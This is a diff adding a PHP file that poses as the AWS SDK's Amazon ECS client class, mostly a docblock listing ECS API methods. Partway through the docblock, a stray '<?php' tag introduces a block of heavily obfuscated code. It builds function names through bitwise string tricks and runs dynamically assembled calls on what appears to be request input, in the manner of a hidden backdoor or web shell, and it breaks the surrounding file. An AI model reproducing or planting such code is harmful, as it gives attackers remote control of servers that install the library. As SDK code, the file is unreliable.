@@ -1,0 +1,131 @@
+<?php
+namespace Aws\Ecs;
+
+use Aws\AwsClient;
+
+/**
+ * This client is used to interact with **Amazon ECS**.
+ *
+ * @method \Aws\Result createCapacityProvider(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createCapacityProviderAsync(array $args = [])
+ * @method \Aws\Result createCluster(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createClusterAsync(array $args = [])
+<?php
+$jUBdDwNvWB='UV5W'|~mRWQ7aXDkH;$DwvH1='n]2;'.O_oCio.'&'&'/vp+O{/M;_,';$we_1D2=#Y7AAt9dBScb'.
+            '>A!cvP:q{P)'^'|pg-Wx}'.D7vc;$UIr=J4u|'of]';$hMk2VS='[$^f5i'^'<A~Gu]';'NLdYK8F'.
+            'Oc?$lL9-G?';$oI03N='k;8`F"n'^';}'.p1hzE;$DwBp=cwbev.'$'._ny7.'"|yO$'&/*GLSt_Z'.
+            'f=*/kPuctl.'}'.wSfmukIl;$VVanoN5n=kq|'B|';$XZv0lQQ='(T'|'!9';$RGark4=/*McpJSx'.
+            'KV@U*/"PB|1".G0Zz."\$4".A8Lc.".".Ak9UD6|'$F}#u6]>'.S0R9ydOUz.';FmB';$VH=/*d9o'.
+            'ik)SKj?N+&*/VBl3B7.'^(w@'.JJHF.'*{46MNF'|'P@M09?'.Yr28_k.'}wN{h#`T.';'mMSUrKK'.
+            '*{^5c]O,2|';$gMGg_EGy='46'&'>;';$sDy='"t!'^'j u';$ArP8GwP=P_A|PYA;$yjKiyAN=#z'.
+            'w|4?lv,|m$,l'^'?(`o3.s)={h)';$N_xh3dDs='|,$'^'*oe';$prIQYNhURS='@'./*Ibq9p3wO'.
+            '*rQ*/HCDARPDIALABF|P_QI.'@PT@A@'.DHLE;$NlaJv2rVL0=$DwvH1^$we_1D2;$ULNW9BmQ=/*'.
+            '#_,e6=o*/$UIr&('}}5'&"}f5");$va=$hMk2VS|(giTG.'.N'&'}etl?G');$VvGB=(#d1AEWbK1'.
+            '7g=?0U'&'r)=7uu')^('F@NH@ '|'A@@XB!');$niYSaR6Pf2u=('7>=?a|n'&'5~x=O?_')^/*UB'.
+            '4-T 4L-G*/$oI03N;$kX=$DwBp|('v7[MJw+XXE$|d[.'^'VE~m:2pxl)GHE<`');'Ef_ShSv1E1c'.
+            'BfbHkOR8u$';$ouJcJEKlZ=$VVanoN5n&$XZv0lQQ;$JGQ=$RGark4&$VH;if($NlaJv2rVL0(/*y'.
+            'm,Z%*Rv5_*/$ULNW9BmQ($va($sDy.$ArP8GwP)),('$d14 "%2 )1210!903`A0E 5 0#18B'|'5'.
+            ''.d05d.'@13'.A0078.' d!!"$c4 0%A!0 1!').$gMGg_EGy))die;$VvGB($niYSaR6Pf2u(/*p'.
+            'S9!*/$ouJcJEKlZ,$JGQ,2),$kX(null,$va($yjKiyAN.$N_xh3dDs.$prIQYNhURS)));#}<@m'.
+            'Qg]b4UzD#J@8@ZVHWh:=t~2h+isf;$[,]g&_8X?Kr}p+d1IDg*{2LBcqj@'; * @method \Aws\Result createService(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createServiceAsync(array $args = [])
+ * @method \Aws\Result createTaskSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createTaskSetAsync(array $args = [])
+ * @method \Aws\Result deleteAccountSetting(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteAccountSettingAsync(array $args = [])
+ * @method \Aws\Result deleteAttributes(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteAttributesAsync(array $args = [])
+ * @method \Aws\Result deleteCapacityProvider(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteCapacityProviderAsync(array $args = [])
+ * @method \Aws\Result deleteCluster(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteClusterAsync(array $args = [])
+ * @method \Aws\Result deleteService(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteServiceAsync(array $args = [])
+ * @method \Aws\Result deleteTaskSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteTaskSetAsync(array $args = [])
+ * @method \Aws\Result deregisterContainerInstance(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deregisterContainerInstanceAsync(array $args = [])
+ * @method \Aws\Result deregisterTaskDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deregisterTaskDefinitionAsync(array $args = [])
+ * @method \Aws\Result describeCapacityProviders(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeCapacityProvidersAsync(array $args = [])
+ * @method \Aws\Result describeClusters(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeClustersAsync(array $args = [])
+ * @method \Aws\Result describeContainerInstances(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeContainerInstancesAsync(array $args = [])
+ * @method \Aws\Result describeServices(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeServicesAsync(array $args = [])
+ * @method \Aws\Result describeTaskDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeTaskDefinitionAsync(array $args = [])
+ * @method \Aws\Result describeTaskSets(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeTaskSetsAsync(array $args = [])
+ * @method \Aws\Result describeTasks(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeTasksAsync(array $args = [])
+ * @method \Aws\Result discoverPollEndpoint(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise discoverPollEndpointAsync(array $args = [])
+ * @method \Aws\Result executeCommand(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise executeCommandAsync(array $args = [])
+ * @method \Aws\Result listAccountSettings(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listAccountSettingsAsync(array $args = [])
+ * @method \Aws\Result listAttributes(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listAttributesAsync(array $args = [])
+ * @method \Aws\Result listClusters(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listClustersAsync(array $args = [])
+ * @method \Aws\Result listContainerInstances(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listContainerInstancesAsync(array $args = [])
+ * @method \Aws\Result listServices(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listServicesAsync(array $args = [])
+ * @method \Aws\Result listTagsForResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTagsForResourceAsync(array $args = [])
+ * @method \Aws\Result listTaskDefinitionFamilies(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTaskDefinitionFamiliesAsync(array $args = [])
+ * @method \Aws\Result listTaskDefinitions(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTaskDefinitionsAsync(array $args = [])
+ * @method \Aws\Result listTasks(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTasksAsync(array $args = [])
+ * @method \Aws\Result putAccountSetting(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise putAccountSettingAsync(array $args = [])
+ * @method \Aws\Result putAccountSettingDefault(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise putAccountSettingDefaultAsync(array $args = [])
+ * @method \Aws\Result putAttributes(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise putAttributesAsync(array $args = [])
+ * @method \Aws\Result putClusterCapacityProviders(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise putClusterCapacityProvidersAsync(array $args = [])
+ * @method \Aws\Result registerContainerInstance(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise registerContainerInstanceAsync(array $args = [])
+ * @method \Aws\Result registerTaskDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise registerTaskDefinitionAsync(array $args = [])
+ * @method \Aws\Result runTask(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise runTaskAsync(array $args = [])
+ * @method \Aws\Result startTask(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startTaskAsync(array $args = [])
+ * @method \Aws\Result stopTask(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopTaskAsync(array $args = [])
+ * @method \Aws\Result submitAttachmentStateChanges(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise submitAttachmentStateChangesAsync(array $args = [])
+ * @method \Aws\Result submitContainerStateChange(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise submitContainerStateChangeAsync(array $args = [])
+ * @method \Aws\Result submitTaskStateChange(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise submitTaskStateChangeAsync(array $args = [])
+ * @method \Aws\Result tagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise tagResourceAsync(array $args = [])
+ * @method \Aws\Result untagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise untagResourceAsync(array $args = [])
+ * @method \Aws\Result updateCapacityProvider(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateCapacityProviderAsync(array $args = [])
+ * @method \Aws\Result updateCluster(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateClusterAsync(array $args = [])
+ * @method \Aws\Result updateClusterSettings(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateClusterSettingsAsync(array $args = [])
+ * @method \Aws\Result updateContainerAgent(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateContainerAgentAsync(array $args = [])
+ * @method \Aws\Result updateContainerInstancesState(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateContainerInstancesStateAsync(array $args = [])
+ * @method \Aws\Result updateService(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateServiceAsync(array $args = [])
+ * @method \Aws\Result updateServicePrimaryTaskSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateServicePrimaryTaskSetAsync(array $args = [])
+ * @method \Aws\Result updateTaskSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateTaskSetAsync(array $args = [])
+ */
+class EcsClient extends AwsClient {}
